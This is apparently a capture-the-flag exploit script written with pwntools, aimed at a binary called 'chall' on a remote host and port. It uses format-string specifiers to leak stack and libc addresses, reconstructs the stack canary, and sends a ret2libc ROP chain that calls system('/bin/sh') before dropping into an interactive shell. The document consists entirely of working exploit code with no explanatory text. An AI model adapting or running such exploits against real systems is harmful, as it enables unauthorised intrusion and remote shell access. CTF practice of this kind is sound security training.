from pwn import *
elf = ELF('/home/kali/Downloads/chall')
p = elf.process()
p=remote('34.159.14.234', 31771)

#gdb.attach(p, gdbscript = 'b *coffee+0x12C8')

p.recvuntil(b'$ ')
#p.sendline(b'%155$p' + b'%156$p' +b'%43$p')

#remote
p.sendline(b'%113$p' + b'%114$p' +b'%39$p')


A = int(p.recv(18), 16)
B = int(p.recv(18), 16)
binary_leak = int(p.recv(14), 16)
pop_rdi_ret = binary_leak + 0x295
ret = pop_rdi_ret - 0x399
binary = ret - 0x101a

print(hex(A))
print(hex(B))
print(hex(pop_rdi_ret))
print(hex(ret))

canary = ( (B & 0xff) << 56 ) | ( (A >> 16) << 8 ) | (A & 0xff)
print(hex(canary))

#local
#printf_offset = 0x31900
#system_offset = 0x2b110
#binsh_offset = 0x17fea4

#2.31
printf_offset = 0x061c90
system_offset = 0x052290
binsh_offset = 0x1b45bd



p.recvuntil(b'this? ')
printf = int(p.recv(14), 16)
log.success(hex(printf))

libc = printf - printf_offset


system = libc + system_offset
binsh = libc + binsh_offset

log.success(f'libc: {hex(libc)}')
print(f'binsh: {hex(binsh)}')
print(f'system: {hex(system)}')

p.recvuntil(b'$ ')

padding_to_canary = 24

payload = (b'\x90' * padding_to_canary + 
	   p64(canary) +
	   b'\x90' * 8 +
	   p64(pop_rdi_ret) +
	   p64(binsh) + 
	   p64(ret) +
	   p64(system))
	   
	   
payload = payload.ljust(80, b'\x90')
	   
	   
p.sendline(payload)
	  

p.interactive()
